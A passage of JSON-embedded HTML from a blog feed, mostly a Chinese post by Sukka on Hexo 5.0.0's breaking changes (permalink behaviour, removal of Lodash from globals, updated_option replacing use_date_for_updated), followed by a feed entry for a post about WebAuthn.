字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]